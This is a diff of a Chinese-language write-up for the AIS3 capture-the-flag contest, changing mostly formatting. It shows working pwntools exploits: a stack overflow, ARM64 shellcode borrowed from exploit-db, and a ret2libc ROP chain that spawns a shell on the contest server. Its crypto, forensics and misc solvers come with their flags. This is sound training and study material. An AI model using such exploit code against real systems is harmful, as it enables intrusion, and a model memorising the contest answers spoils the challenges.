@@ -321,253 +321,255 @@ Flag: `AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}`
 ### SAAS — Crash
 
 1.  `String` 的 [destructor](https://en.cppreference.com/w/cpp/language/destructor) 會把 `str` delete 掉，但沒有把 `str` 設回 `nullptr`，留下 dangling pointer。而 `print` 會呼叫 [copy constructor](https://en.cppreference.com/w/cpp/language/copy_constructor) 把 `s` 的 member 都 copy 過來，然後在 `print` 結束時呼叫 `String` 的 destructor 把 `s` 清掉，因此只要連續 `print` 兩次，就可以 double free `s.str`。
-```cpp
-class String {
-   public:
-	char *str;
-	size_t len;
 
-	String(const char *s) {
-		len = strlen(s);
-		str = new char[len + 1];
-		strcpy(str, s);
-	}
-	~String() { delete[] str; }
-};
+    ```cpp
+    class String {
+       public:
+        char *str;
+        size_t len;
 
-void print(String s) {
-	printf("Length: %zu\n", s.len);
-	printf("Content: ");
-	write(1, s.str, s.len);
-	printf("\n");
-}
-```
+        String(const char *s) {
+            len = strlen(s);
+            str = new char[len + 1];
+            strcpy(str, s);
+        }
+        ~String() { delete[] str; }
+    };
+
+    void print(String s) {
+        printf("Length: %zu\n", s.len);
+        printf("Content: ");
+        write(1, s.str, s.len);
+        printf("\n");
+    }
+    ```
 
 2. 建立 string 之後 print 兩次得到 flag。
 
-```bash
-===== S(tring)AAS =====
-1. Create string
-2. Edit string
-3. Print string
-4. Delete string
-> 1
-Index: 0
-Content: aaaa
-===== S(tring)AAS =====
-1. Create string
-2. Edit string
-3. Print string
-4. Delete string
-> 3
-Index: 0
-Length: 4
-Content: aaaa
-===== S(tring)AAS =====
-1. Create string
-2. Edit string
-3. Print string
-4. Delete string
-> 3
-Index: 0
-Length: 4
-Content:
-free(): double free detected in tcache 2
-Aborted (core dumped)
-```
+    ```bash
+    ===== S(tring)AAS =====
+    1. Create string
+    2. Edit string
+    3. Print string
+    4. Delete string
+    > 1
+    Index: 0
+    Content: aaaa
+    ===== S(tring)AAS =====
+    1. Create string
+    2. Edit string
+    3. Print string
+    4. Delete string
+    > 3
+    Index: 0
+    Length: 4
+    Content: aaaa
+    ===== S(tring)AAS =====
+    1. Create string
+    2. Edit string
+    3. Print string
+    4. Delete string
+    > 3
+    Index: 0
+    Length: 4
+    Content:
+    free(): double free detected in tcache 2
+    Aborted (core dumped)
+    ```
 
-**Flag: `AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}`**
+Flag: `AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}`
 
 ### BOF2WIN
 
 1. 純粹的 stack buffer overflow。
-```python
-from pwn import *
 
-p = remote('127.0.0.1', 12347)
-p = remote('chals1.ais3.org', 12347)
+    ```python
+    from pwn import *
 
-flag_adr = 0x401216
+    p = remote('127.0.0.1', 12347)
+    p = remote('chals1.ais3.org', 12347)
 
-payload = b'A'*24
-payload += flag_adr.to_bytes(8, 'little')
+    flag_adr = 0x401216
 
-p.recv()
-p.sendline(payload)
-print(p.recv())
-print(p.recv().strip(b'\x00').decode())
-```
+    payload = b'A'*24
+    payload += flag_adr.to_bytes(8, 'little')
 
-**Flag: `AIS3{Re@1_B0F_m4st3r!!}`**
+    p.recv()
+    p.sendline(payload)
+    print(p.recv())
+    print(p.recv().strip(b'\x00').decode())
+    ```
+
+Flag: `AIS3{Re@1_B0F_m4st3r!!}`
 
 ### Give Me SC
 
 1. 不會寫 ARM64 shellcode 就上網找一份來用。
 
-```python
-from pwn import *
+    ```python
+    from pwn import *
 
-p = remote('127.0.0.1', 15566)
-p = remote('chals1.ais3.org', 15566)
+    p = remote('127.0.0.1', 15566)
+    p = remote('chals1.ais3.org', 15566)
 
-# ref: https://www.exploit-db.com/exploits/47048
-shellcode = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
+    # ref: https://www.exploit-db.com/exploits/47048
+    shellcode = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
 
-p.recv()
-p.send(b'AAAA')
-p.recv()
-p.send(shellcode)
-print(p.recv())
-p.sendline(b'cat home/give_me_sc/flag')
-print(p.recv().decode())
-print(p.recv().decode())
-# p.interactive()
-```
+    p.recv()
+    p.send(b'AAAA')
+    p.recv()
+    p.send(shellcode)
+    print(p.recv())
+    p.sendline(b'cat home/give_me_sc/flag')
+    print(p.recv().decode())
+    print(p.recv().decode())
+    # p.interactive()
+    ```
 
-**Flag: `AIS3{Y0uR_f1rst_Aarch64_Shellcoding}`**
+Flag: `AIS3{Y0uR_f1rst_Aarch64_Shellcoding}`
 
 ### Magic
 
 1. 嘗試幾次輸入之後，會發現有時候會突然 read 或 write 很多 bytes。
 2. 用 `gdb` 追進去發現正常 `read` 結束後會另外計算 `read` 和 `write` 的次數。
 
-```python
-   0x401d06    push   rax
-   0x401d07    push   rdi
-   0x401d08    push   rsi
-   0x401d09    push   rdx
-   0x401d0a    mov    rax, 1
-   0x401d11    mov    rdi, 0
-   0x401d18    mov    rsi, 0x404f20
-   0x401d1f    mov    rdx, 5
-   0x401d26    syscall              // write(stdout, 0x404f20, 5)
-   0x401d28    pop    rdx
-   0x401d29    pop    rsi
-   0x401d2a    pop    rdi
-   0x401d2b    pop    rax
-   0x401d2c    mov    rax, 0x404f00
-   0x401d33    add    qword ptr [rax], 1
-   0x401d37    mov    rax, qword ptr [rax]
-   0x401d3a    mov    rbx, 0x404f08
-   0x401d41    mov    rbx, qword ptr [rbx]
-   0x401d44    mov    r8, 0x404f10          // original read
-   0x401d4b    mov    r8, qword ptr [r8]
-   0x401d4e    cmp    rax, 0xe     // check: [0x404f00] == 0xe
-   0x401d52    jne    0x401d61
-   0x401d54    cmp    rbx,0x8      // check: [0x404f08] == 0x8
-   0x401d58    jne    0x401d61
-   0x401d5a    mov    rdx,0x1000
-   0x401d61    jmp    r8
-```
+    ```python
+       0x401d06    push   rax
+       0x401d07    push   rdi
+       0x401d08    push   rsi
+       0x401d09    push   rdx
+       0x401d0a    mov    rax, 1
+       0x401d11    mov    rdi, 0
+       0x401d18    mov    rsi, 0x404f20
+       0x401d1f    mov    rdx, 5
+       0x401d26    syscall              // write(stdout, 0x404f20, 5)
+       0x401d28    pop    rdx
+       0x401d29    pop    rsi
+       0x401d2a    pop    rdi
+       0x401d2b    pop    rax
+       0x401d2c    mov    rax, 0x404f00
+       0x401d33    add    qword ptr [rax], 1
+       0x401d37    mov    rax, qword ptr [rax]
+       0x401d3a    mov    rbx, 0x404f08
+       0x401d41    mov    rbx, qword ptr [rbx]
+       0x401d44    mov    r8, 0x404f10          // original read
+       0x401d4b    mov    r8, qword ptr [r8]
+       0x401d4e    cmp    rax, 0xe     // check: [0x404f00] == 0xe
+       0x401d52    jne    0x401d61
+       0x401d54    cmp    rbx,0x8      // check: [0x404f08] == 0x8
+       0x401d58    jne    0x401d61
+       0x401d5a    mov    rdx,0x1000
+       0x401d61    jmp    r8
+    ```
 
 3. `write` 也有同樣的操作。
 
-```python
-   0x401e00    push   rax
-   0x401e01    push   rdi
-   0x401e02    push   rsi
-   0x401e03    push   rdx
-   0x401e04    mov    rax,0x1
-   0x401e0b    mov    rdi,0x0
-   0x401e12    mov    rsi,0x404f28
-   0x401e19    mov    rdx,0x5
-   0x401e20    syscall
-   0x401e22    pop    rdx
-   0x401e23    pop    rsi
-   0x401e24    pop    rdi
-   0x401e25    pop    rax
-   0x401e26    mov    rax,0x404f08
-   0x401e2d    add    QWORD PTR [rax],0x1
-   0x401e31    mov    rax,QWORD PTR [rax]
-   0x401e34    mov    rbx,0x404f00
-   0x401e3b    mov    rbx,QWORD PTR [rbx]
-   0x401e3e    mov    r8,0x404f18
-   0x401e45    mov    r8,QWORD PTR [r8]
-   0x401e48    cmp    rax,0x3
-   0x401e4c    jne    0x401e5b
-   0x401e4e    cmp    rbx,0x7
-   0x401e52    jne    0x401e5b
-   0x401e54    mov    rdx,0x100
-   0x401e5b    jmp    r8
-```
+    ```python
+       0x401e00    push   rax
+       0x401e01    push   rdi
+       0x401e02    push   rsi
+       0x401e03    push   rdx
+       0x401e04    mov    rax,0x1
+       0x401e0b    mov    rdi,0x0
+       0x401e12    mov    rsi,0x404f28
+       0x401e19    mov    rdx,0x5
+       0x401e20    syscall
+       0x401e22    pop    rdx
+       0x401e23    pop    rsi
+       0x401e24    pop    rdi
+       0x401e25    pop    rax
+       0x401e26    mov    rax,0x404f08
+       0x401e2d    add    QWORD PTR [rax],0x1
+       0x401e31    mov    rax,QWORD PTR [rax]
+       0x401e34    mov    rbx,0x404f00
+       0x401e3b    mov    rbx,QWORD PTR [rbx]
+       0x401e3e    mov    r8,0x404f18
+       0x401e45    mov    r8,QWORD PTR [r8]
+       0x401e48    cmp    rax,0x3
+       0x401e4c    jne    0x401e5b
+       0x401e4e    cmp    rbx,0x7
+       0x401e52    jne    0x401e5b
+       0x401e54    mov    rdx,0x100
+       0x401e5b    jmp    r8
+    ```
 
 4. 整理一下可以發現當 `read` 2 次、 `write` 3 次時可以 read 0x100 bytes，而當 `read` 3 次、 `write` 8 次時可以寫 0x1000 bytes。各個 memory 紀錄的數值如下：
 
-  - `[0x404f00]` counts how many time read been called
-  - `[0x404f08]` counts how many time write been called
-  - `[0x404f10]` original read
-  - `[0x404f18]` original write
+    - `[0x404f00]` counts how many time read been called
+    - `[0x404f08]` counts how many time write been called
+    - `[0x404f10]` original read
+    - `[0x404f18]` original write
 
 5. 因此我們可以用 `read` 0x100 bytes 來 leak glibc (libc version 可從提供的 container 得知)，然後用 `write` 0x1000 bytes 做 ret2libc。
 
-```python
-from pwn import *
+    ```python
+    from pwn import *
 
-#p = remote('127.0.0.1', 12348)
-p = remote('chals1.ais3.org', 12348)
-debug = False
+    #p = remote('127.0.0.1', 12348)
+    p = remote('chals1.ais3.org', 12348)
+    debug = False
 
-#p = process('./magic/share/magic')
-#p = gdb.debug('./magic/share/magic', gdbscript='continue')
-#debug = True
+    #p = process('./magic/share/magic')
+    #p = gdb.debug('./magic/share/magic', gdbscript='continue')
+    #debug = True
 
-def read():
-    print('[*] Reading')
-    print(p.recvuntil(b'> '))
-    p.sendline(b'w')
-    data = p.recvuntil(b'read')[:-4]
-    print('[*] Read', data)
-    return data
+    def read():
+        print('[*] Reading')
+        print(p.recvuntil(b'> '))
+        p.sendline(b'w')
+        data = p.recvuntil(b'read')[:-4]
+        print('[*] Read', data)
+        return data
 
-def write(data=b'A'):
-    print('[*] Writing')
-    print(p.recvuntil(b'> '))
-    p.sendline(b'r')
-    p.send(data)
-    print('[*] Written', data)
-    return
+    def write(data=b'A'):
+        print('[*] Writing')
+        print(p.recvuntil(b'> '))
+        p.sendline(b'r')
+        p.send(data)
+        print('[*] Written', data)
+        return
 
-def super_read():
-    write()
-    write()
-    read()
-    read()
-    data = read()
-    return data
-
-def super_write(payload):
-    for _ in range(5):
+    def super_read():
+        write()
+        write()
         read()
-    write(payload)
+        read()
+        data = read()
+        return data
 
-# leak libc: version libc6_2.31-0ubuntu9.2_amd64
-leak = super_read()
-print('leak:', leak)
+    def super_write(payload):
+        for _ in range(5):
+            read()
+        write(payload)
 
-if debug:
-    libc = int.from_bytes(leak[22:22+8], 'little') - 0x240b3
-else:
-    libc = int.from_bytes(leak[27:27+8], 'little') - 0x240b3
-print(f'[+] Libc base: {libc:#2x}')
-padding = b'A'*22
-system = libc + 0x522c0
-bin_sh = libc + 0x1b45bd
-pop_rdi = 0x401313
-ret = 0x40101a
+    # leak libc: version libc6_2.31-0ubuntu9.2_amd64
+    leak = super_read()
+    print('leak:', leak)
 
-payload = padding
-payload += p64(pop_rdi)
-payload += p64(bin_sh)
-payload += p64(ret)
-payload += p64(system)
-print(payload)
-super_write(payload)
-p.sendline(b'c')
-p.interactive()
+    if debug:
+        libc = int.from_bytes(leak[22:22+8], 'little') - 0x240b3
+    else:
+        libc = int.from_bytes(leak[27:27+8], 'little') - 0x240b3
+    print(f'[+] Libc base: {libc:#2x}')
+    padding = b'A'*22
+    system = libc + 0x522c0
+    bin_sh = libc + 0x1b45bd
+    pop_rdi = 0x401313
+    ret = 0x40101a
 
-```
+    payload = padding
+    payload += p64(pop_rdi)
+    payload += p64(bin_sh)
+    payload += p64(ret)
+    payload += p64(system)
+    print(payload)
+    super_write(payload)
+    p.sendline(b'c')
+    p.interactive()
 
-**Flag: `AIS3{ma4a4a4aGiCian}`**
+    ```
+
+Flag: `AIS3{ma4a4a4aGiCian}`
 
 
 ### UTF-8 Editor — Crash
@@ -575,7 +577,7 @@ p.interactive()
 1. 輸入 `你ㄏ`，讓 `ㄏ` 注音組字的階段，然後刪掉 `你ㄏ`，會留下一個類似空白的東西，輸入進去，然後 print 就解了。
 2. 猜測應該是我的環境有一些編碼問題之類的，肯定不是 intended XD
 
-**Flag: `AIS3{unsigned_intergers_are_so_cool}`**
+Flag: `AIS3{unsigned_intergers_are_so_cool}`
 
 ## Crypto
 
@@ -583,101 +585,102 @@ p.interactive()
 
 1. `cipher.py` 建立隨機的 substitution cipher，然後給我們替換過後的 `cipher.py.enc` 和 `flag.txt.enc`。因為 `cipher.py.enc` 有足夠多字元，因此我可以用它重建 substitution 的 mapping，然後把 `flag.txt.enc` decrypt 回來。
 
-```python
-import string
+    ```python
+    import string
 
-charset = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
-enc_charset = [None for _ in range(len(charset))]
+    charset = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
+    enc_charset = [None for _ in range(len(charset))]
 
-print(charset)
+    print(charset)
 
-txt = open('./cipher.py', 'r').read()
-enc = open('./cipher.py.enc', 'r').read()
+    txt = open('./cipher.py', 'r').read()
+    enc = open('./cipher.py.enc', 'r').read()
 
-for i in range(len(txt)):
-    c = txt[i]
-    enc_c = enc[i]
-    if c in charset:
-        idx = charset.index(c)
-        enc_charset[idx] = enc_c
+    for i in range(len(txt)):
+        c = txt[i]
+        enc_c = enc[i]
+        if c in charset:
+            idx = charset.index(c)
+            enc_charset[idx] = enc_c
 
 
-charset = ''.join(charset)
-enc_charset = ''.join([x if x is not None else '@' for x in enc_charset])
+    charset = ''.join(charset)
+    enc_charset = ''.join([x if x is not None else '@' for x in enc_charset])
 
-T = str.maketrans(enc_charset, charset)
+    T = str.maketrans(enc_charset, charset)
 
-with open('./flag.txt.enc', 'r') as f:
-    enc_flag = f.read()
-print(enc_flag.translate(T))
-```
+    with open('./flag.txt.enc', 'r') as f:
+        enc_flag = f.read()
+    print(enc_flag.translate(T))
+    ```
 
-**Flag: `AIS3{s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack}`**
+Flag: `AIS3{s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack}`
 
 ### Fast Cipher
 
 1. 因為會和 `0xff` 取 bitwise and，因此只要找到和初始的 `key` 最後一個 byte 相同的數即可。(應該是這樣吧，我也沒有非常確定我的思路是不是對的...)。
-```python
-from secrets import randbelow
 
-M = 2**1024
+    ```python
+    from secrets import randbelow
 
-def f(x):
-    # this is a *fast* function
-    return (
-        4 * x**4 + 8 * x**8 + 7 * x**7 + 6 * x**6 + 3 * x**3 + 0x48763
-    ) % M
+    M = 2**1024
 
-def encrypt(pt, key):
-    ct = []
-    for c in pt:
-        ct.append(c ^ (key & 0xFF))
-        key = f(key)
-    return bytes(ct)
+    def f(x):
+        # this is a *fast* function
+        return (
+            4 * x**4 + 8 * x**8 + 7 * x**7 + 6 * x**6 + 3 * x**3 + 0x48763
+        ) % M
 
-if __name__ == "__main__":
-    key = randbelow(M)
-    ct = encrypt(open("flag.txt", "rb").read().strip(), key)
-    print(ct.hex())
-```
+    def encrypt(pt, key):
+        ct = []
+        for c in pt:
+            ct.append(c ^ (key & 0xFF))
+            key = f(key)
+        return bytes(ct)
+
+    if __name__ == "__main__":
+        key = randbelow(M)
+        ct = encrypt(open("flag.txt", "rb").read().strip(), key)
+        print(ct.hex())
+    ```
 
 2. 寫個 script 爆搜一下，馬上就能算出 flag。
 
-```python
-M = 2**1024
+    ```python
+    M = 2**1024
 
-with open('./output.txt', 'r') as f:
-    enc_flag = f.read().strip()
-enc_flag = int(enc_flag, 16).to_bytes(64, 'big').strip(b'\x00')
+    with open('./output.txt', 'r') as f:
+        enc_flag = f.read().strip()
+    enc_flag = int(enc_flag, 16).to_bytes(64, 'big').strip(b'\x00')
 
-def f(x):
-    # this is a *fast* function
-    return (
-        4 * x**4 + 8 * x**8 + 7 * x**7 + 6 * x**6 + 3 * x**3 + 0x48763
-    ) % M
+    def f(x):
+        # this is a *fast* function
+        return (
+            4 * x**4 + 8 * x**8 + 7 * x**7 + 6 * x**6 + 3 * x**3 + 0x48763
+        ) % M
 
-def decrypt(key):
-    flag = ''
-    for e in enc_flag:
-        flag += chr(e ^ (key & 0xff))
-        key = f(key)
-    if 'AIS3' in flag:
-        print(flag)
-        exit(0)
+    def decrypt(key):
+        flag = ''
+        for e in enc_flag:
+            flag += chr(e ^ (key & 0xff))
+            key = f(key)
+        if 'AIS3' in flag:
+            print(flag)
+            exit(0)
 
-for k in range(2**1024):
-    tmp = ''
-    tmp_k = k
-    for c in enc_flag[:4]:
-        tmp += chr(c ^ (tmp_k & 0xff))
-        tmp_k = f(tmp_k)
-    if tmp == 'AIS3':
-        print('repeat!', k)
-        decrypt(k)
-        break
-```
+    for k in range(2**1024):
+        tmp = ''
+        tmp_k = k
+        for c in enc_flag[:4]:
+            tmp += chr(c ^ (tmp_k & 0xff))
+            tmp_k = f(tmp_k)
+        if tmp == 'AIS3':
+            print('repeat!', k)
+            decrypt(k)
+            break
+    ```
 
-**Flag: `AIS3{not_every_bits_are_used_lol}`**
+Flag: `AIS3{not_every_bits_are_used_lol}`
 
 ## Misc
 
@@ -686,89 +689,87 @@ for k in range(2**1024):
 1. `xlsm` 是包含 macro 的 xls 檔，可以用 `unzip` 解開，然後在 `xl/macrosheets/` 找到 macro sheet `sheet1.xml`。
 2. 跟 Execl 和 macro 實在不熟，最後直接寫個 script hardcode to win...。
 
-```python
-# from chal/xl/macrosheets/sheet1.xml
-a = '''
-FORMULA(mqLen!D14&amp;Mment!BA10&amp;coCGA!S17&amp;coCGA!Q19&amp;KRnsl!L19&amp;Mment!F3&amp;coCGA!G26&amp;coCGA!O23&amp;coCGA!P3&amp;coCGA!K12&amp;KRnsl!J19&amp;KRnsl!C11&amp;coCGA!N3&amp;mqLen!E4&amp;coCGA!D11&amp;KRnsl!T5&amp;JVHco!K10&amp;mqLen!BA14&amp;Mment!W1&amp;KRnsl!U13&amp;KRnsl!V9&amp;mqLen!C12&amp;KRnsl!J4&amp;Mment!Y19&amp;mqLen!K19&amp;JVHco!F2&amp;mqLen!K10&amp;coCGA!Z15&amp;mqLen!N21&amp;Mment!N1&amp;Mment!S2&amp;coCGA!X2&amp;Mment!D16&amp;coCGA!U26&amp;coCGA!R1&amp;mqLen!V9&amp;mqLen!R11&amp;Mment!X1&amp;coCGA!D5&amp;KRnsl!Z19&amp;mqLen!BA4&amp;coCGA!Z9&amp;coCGA!G7&amp;mqLen!U10&amp;Mment!U11&amp;coCGA!G18&amp;JVHco!V1&amp;mqLen!O26&amp;Mment!G5&amp;KRnsl!H22&amp;Mment!P10&amp;JVHco!W17&amp;Mment!F8&amp;coCGA!L15&amp;coCGA!H3&amp;KRnsl!U17&amp;KRnsl!BA11&amp;coCGA!X12&amp;KRnsl!F14&amp;Mment!B10&amp;KRnsl!V12&amp;Mment!U12&amp;coCGA!P14&amp;coCGA!Y1&amp;JVHco!B10&amp;JVHco!F16&amp;KRnsl!Q26&amp;Mment!P25&amp;KRnsl!M3&amp;KRnsl!I26&amp;mqLen!L15&amp;mqLen!V25&amp;KRnsl!G2&amp;Mment!I18&amp;Mment!M4&amp;KRnsl!C7&amp;JVHco!N5&amp;KRnsl!M19&amp;Mment!J9&amp;Mment!I7&amp;coCGA!G13&amp;KRnsl!M12&amp;mqLen!X2&amp;mqLen!M1&amp;JVHco!P3&amp;KRnsl!S12&amp;Mment!U10&amp;JVHco!D16&amp;mqLen!P17&amp;KRnsl!I5&amp;coCGA!W24&amp;JVHco!E10&amp;Mment!B8&amp;coCGA!C14&amp;JVHco!Z15&amp;Mment!BA11&amp;coCGA!F19&amp;KRnsl!Z2&amp;JVHco!D13&amp;Mment!O2&amp;KRnsl!D19&amp;Mment!K19&amp;Mment!U20&amp;JVHco!Q9&amp;KRnsl!I17&amp;coCGA!X17&amp;JVHco!Q24&amp;KRnsl!Q4&amp;coCGA!N21&amp;coCGA!W11&amp;JVHco!E17&amp;mqLen!H19&amp;KRnsl!X6&amp;coCGA!N26&amp;coCGA!N18&amp;KRnsl!Q17&amp;JVHco!J25&amp;KRnsl!Z16&amp;mqLen!P13&amp;coCGA!Z21&amp;JVHco!C24&amp;Mment!X19&amp;Mment!O21,A137)
-'''.strip()
-a = a[8:-6]
-a = a.replace('&amp;', '&')
-a = a.split('&')
+    ```python
+    # from chal/xl/macrosheets/sheet1.xml
+    a = '''
+    FORMULA(mqLen!D14&amp;Mment!BA10&amp;coCGA!S17&amp;coCGA!Q19&amp;KRnsl!L19&amp;Mment!F3&amp;coCGA!G26&amp;coCGA!O23&amp;coCGA!P3&amp;coCGA!K12&amp;KRnsl!J19&amp;KRnsl!C11&amp;coCGA!N3&amp;mqLen!E4&amp;coCGA!D11&amp;KRnsl!T5&amp;JVHco!K10&amp;mqLen!BA14&amp;Mment!W1&amp;KRnsl!U13&amp;KRnsl!V9&amp;mqLen!C12&amp;KRnsl!J4&amp;Mment!Y19&amp;mqLen!K19&amp;JVHco!F2&amp;mqLen!K10&amp;coCGA!Z15&amp;mqLen!N21&amp;Mment!N1&amp;Mment!S2&amp;coCGA!X2&amp;Mment!D16&amp;coCGA!U26&amp;coCGA!R1&amp;mqLen!V9&amp;mqLen!R11&amp;Mment!X1&amp;coCGA!D5&amp;KRnsl!Z19&amp;mqLen!BA4&amp;coCGA!Z9&amp;coCGA!G7&amp;mqLen!U10&amp;Mment!U11&amp;coCGA!G18&amp;JVHco!V1&amp;mqLen!O26&amp;Mment!G5&amp;KRnsl!H22&amp;Mment!P10&amp;JVHco!W17&amp;Mment!F8&amp;coCGA!L15&amp;coCGA!H3&amp;KRnsl!U17&amp;KRnsl!BA11&amp;coCGA!X12&amp;KRnsl!F14&amp;Mment!B10&amp;KRnsl!V12&amp;Mment!U12&amp;coCGA!P14&amp;coCGA!Y1&amp;JVHco!B10&amp;JVHco!F16&amp;KRnsl!Q26&amp;Mment!P25&amp;KRnsl!M3&amp;KRnsl!I26&amp;mqLen!L15&amp;mqLen!V25&amp;KRnsl!G2&amp;Mment!I18&amp;Mment!M4&amp;KRnsl!C7&amp;JVHco!N5&amp;KRnsl!M19&amp;Mment!J9&amp;Mment!I7&amp;coCGA!G13&amp;KRnsl!M12&amp;mqLen!X2&amp;mqLen!M1&amp;JVHco!P3&amp;KRnsl!S12&amp;Mment!U10&amp;JVHco!D16&amp;mqLen!P17&amp;KRnsl!I5&amp;coCGA!W24&amp;JVHco!E10&amp;Mment!B8&amp;coCGA!C14&amp;JVHco!Z15&amp;Mment!BA11&amp;coCGA!F19&amp;KRnsl!Z2&amp;JVHco!D13&amp;Mment!O2&amp;KRnsl!D19&amp;Mment!K19&amp;Mment!U20&amp;JVHco!Q9&amp;KRnsl!I17&amp;coCGA!X17&amp;JVHco!Q24&amp;KRnsl!Q4&amp;coCGA!N21&amp;coCGA!W11&amp;JVHco!E17&amp;mqLen!H19&amp;KRnsl!X6&amp;coCGA!N26&amp;coCGA!N18&amp;KRnsl!Q17&amp;JVHco!J25&amp;KRnsl!Z16&amp;mqLen!P13&amp;coCGA!Z21&amp;JVHco!C24&amp;Mment!X19&amp;Mment!O21,A137)
+    '''.strip()
+    a = a[8:-6]
+    a = a.replace('&amp;', '&')
+    a = a.split('&')
 
-# hardcore...
-flag = ''
-for i in a:
-    c = input(f'{i} >')
-    if c.isnumeric():
-        c = chr(int(c))
-    flag += c
-print(flag)
-```
+    # hardcore...
+    flag = ''
+    for i in a:
+        c = input(f'{i} >')
+        if c.isnumeric():
+            c = chr(int(c))
+        flag += c
+    print(flag)
+    ```
 
-**Flag: ` AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}`**
+Flag: ` AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}`
 
 ### Gift in the dream
 
 1. `strings` GIF 檔可以看到一些 hint，因此猜測 flag 跟 GIF 中每個 frame 的 duration 有關。寫個 script print 出來看看。
 
-```python
-from PIL import Image
+    ```python
+    from PIL import Image
 
-# ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python
+    # ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python
 
-im = Image.open('./gift_in_the_dream_updated.gif')
-try:
-    while 1:
-        print(im.info['duration'])
-        im.seek(im.tell()+1)
-except EOFError:
-    pass
-```
-
+    im = Image.open('./gift_in_the_dream_updated.gif')
+    try:
+        while 1:
+            print(im.info['duration'])
+            im.seek(im.tell()+1)
+    except EOFError:
+        pass
+    ```
 <img width="800" alt="gift-in-the-dream-durations" src="https://user-images.githubusercontent.com/38059464/176882746-edc345bd-2ce1-4cbb-a0c3-4c33955ebbbd.png">
 
 2. 可以發現 `duration / 10` 皆在 ASCII 範圍內，因此把 `duration / 10` 組合起來即為 flag。 
 
-```python
-from PIL import Image
+    ```python
+    from PIL import Image
 
-# ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python
+    # ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python
 
-im = Image.open('./gift_in_the_dream_updated.gif')
+    im = Image.open('./gift_in_the_dream_updated.gif')
 
-flag = ''
-try:
-    while 1:
-        flag += chr(im.info['duration'] // 10)
-        im.seek(im.tell()+1)
-except EOFError:
-    pass
+    flag = ''
+    try:
+        while 1:
+            flag += chr(im.info['duration'] // 10)
+            im.seek(im.tell()+1)
+    except EOFError:
+        pass
 
-print(flag)
-```
+    print(flag)
+    ```
 
-**Flag: `AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}`**
+Flag: `AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}`
 
 ### Knock
 
 1. 根據題目猜測 knock 應該是指 server 會嘗試透過網路戳參賽者的機器，因此用 Wireshark listen 在 VPN 的 interface，發現有一些多的 UDP 封包。
-
 <img width="800" alt="knock-udp-packets" src="https://user-images.githubusercontent.com/38059464/176883739-82d28564-3957-4386-be14-5371673d6285.png">
 
 2. 觀察發現 UDP packet 的 dest. port 最後兩位數都在 ASCII 範圍內，且前四個封包 `63 73 83 51` 便是 `AIS3`，因此拉出來即是 flag。這題感覺有點通靈，但其實是一種 exfiltration 的方法。
 
-```python
-import scapy.all as scapy
+    ```python
+    import scapy.all as scapy
 
-packets = scapy.rdpcap('./knock.pcapng')
+    packets = scapy.rdpcap('./knock.pcapng')
 
-knock_packets = packets[scapy.UDP][12:]
+    knock_packets = packets[scapy.UDP][12:]
 
-flag = ''
-for p in knock_packets:
-    flag += chr(p.dport - 12000)
+    flag = ''
+    for p in knock_packets:
+        flag += chr(p.dport - 12000)
 
-print(flag)
-```
+    print(flag)
+    ```
 
-**Flag: `AIS3{kn0ckKNOCKknock}`**
+Flag: `AIS3{kn0ckKNOCKknock}`
